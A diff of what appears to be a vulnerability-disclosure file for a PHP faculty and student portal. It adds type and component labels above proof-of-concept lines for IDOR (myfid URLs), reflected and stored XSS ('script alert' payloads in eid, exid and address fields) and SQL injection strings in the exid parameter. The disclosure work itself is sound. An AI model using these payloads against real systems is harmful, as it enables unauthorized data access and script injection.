@@ -40,6 +40,10 @@ Poc IDOR:
 ___
 
 ## CVE Request 1928465:
+- Presentation: IDOR (Insecure Direct Object)-  via GET myfid parameter
+- Security vulnerability: Insecure Direct Object
+- Vulnerability Type: Broken Access Control
+- Affected Component: mydetailsfaculty.php endpoint — GET parameter myfid
 Poc IDOR:
 - /mydetailsfaculty.php?myfid=102
 - /mydetailsfaculty.php?myfid=101
@@ -51,7 +55,10 @@ Poc IDOR:
 ___
 
 ## CVE Request 1928471:
-
+- Presentation: IDOR (Insecure Direct Object)-  via GET myfid parameter
+- Security vulnerability: Insecure Direct Object
+- Vulnerability Type: Broken Access Control
+- Affected Component: updatedetailsfromfaculty.php endpoint — GET parameter myfid
 Poc IDOR:
 - /updatedetailsfromfaculty.php?myfid=102
 - /updatedetailsfromfaculty.php?myfid=101
@@ -65,6 +72,11 @@ ___
 # XSS
 
 ## CVE Request 1928476:
+- Presentation: XSS (Cross-Site Scripting)-  via GET eid parameter
+- Security vulnerability: Cross-Site Scripting Reflect
+- Vulnerability Type: Injection
+- Affected Component: askquery.php endpoint — GET parameter eid
+
 Poc XSS Reflect:
 - /askquery.php?eid="><script>alert("Carlos%20Tuma%20-%20Bl4dsc4n")</script>
 
@@ -75,6 +87,11 @@ Poc XSS Reflect:
 ___
 
 ## CVE Request 1928478:
+- Presentation: XSS (Cross-Site Scripting)-  via GET exid parameter
+- Security vulnerability: Cross-Site Scripting Reflect
+- Vulnerability Type: Injection
+- Affected Component: takeassessment2.php endpoint — GET parameter exid
+  
 Poc XSS Reflect:
 
 - /takeassessment2.php?exid=6"><script>alert("Carlos%20Tuma%20-%20Bl4dsc4n")</script>
@@ -86,8 +103,12 @@ Poc XSS Reflect:
 ___
 
 ## CVE Request 1928485
-Poc XSS Storage:
-
+- Presentation: XSS (Cross-Site Scripting)-  via GET exid parameter
+- Security vulnerability: Cross-Site Scripting Storage
+- Vulnerability Type: Injection
+- Affected Component: updatedetailsfromstudent.php  endpoint — GET parameter eno - parameter Addres.
+  
+Poc XSS Storage:  
 - /updatedetailsfromstudent.php?eno=146891650
 - Addres: "><script>alert("Carlos%20Tuma%20-%20Bl4dsc4n")</script>
 
@@ -102,6 +123,11 @@ Poc XSS Storage:
 
 ___
 ## CVE Request 1928493
+- Presentation: XSS (Cross-Site Scripting)-  via GET exid parameter
+- Security vulnerability: Cross-Site Scripting Storage
+- Vulnerability Type: Injection
+- Affected Component: updatedetailsfromfaculty.php  endpoint — GET parameter myfid - parameter Addres.
+
 Poc XSS Storage:
 - /updatedetailsfromfaculty.php?myfid=101
 - Address : "><script>alert("Carlos%20Tuma%20-%20Bl4dsc4n")</script>
@@ -119,6 +145,12 @@ ___
 # SQL 
 
 ## CVE Request 1928480
+- Presentation: SQLi (SQl Injection)-  via GET exid parameter
+- Security vulnerability: Sql Injection Union Based
+- Vulnerability Type: Injection
+- Affected Component: takeassessment2.php endpoint — GET parameter exid
+
+
 Poc SQLi:
 - /takeassessment2.php?exid=6%27%20or%201=1--%20-
 - /takeassessment2.php?exid=6%27%20ORDER%20BY%201--%20-
